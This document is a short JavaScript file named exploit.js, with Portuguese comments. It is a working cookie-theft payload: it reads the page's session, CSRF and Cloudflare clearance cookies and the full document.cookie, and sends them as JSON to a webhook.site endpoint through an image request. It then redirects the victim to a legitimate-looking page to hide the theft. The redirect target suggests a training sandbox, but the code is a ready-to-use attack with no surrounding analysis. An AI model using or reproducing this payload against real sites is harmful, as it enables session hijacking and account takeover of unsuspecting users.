// exploit.js — enumera cookies e reporta acessibilidade individual
(function () {
  var webhook = 'https://webhook.site/9987267d-7243-4e76-b9a4-36ea4b7303e4';

  function getCookie(name) {
    var m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return m ? decodeURIComponent(m[1]) : null;
  }

  var alvo = ['session', 'csrf_token', 'cf_clearance'];
  var relatorio = {
    url: location.href,
    all_cookies: document.cookie || '(vazio)',
    acessiveis: {},
    nao_acessiveis_httpOnly: []
  };

  alvo.forEach(function (c) {
    var v = getCookie(c);
    if (v !== null) {
      relatorio.acessiveis[c] = v;
    } else {
      relatorio.nao_acessiveis_httpOnly.push(c);
    }
  });

  // Exfiltra o relatório como JSON na query string
  new Image().src = webhook + '?d=' + encodeURIComponent(JSON.stringify(relatorio));

  // Cloaking: devolve o usuário para a página legítima
  setTimeout(function () {
    window.location.href = 'https://sandbox.datacentrics.com.br/academy/ntsec/';
  }, 300);
})();
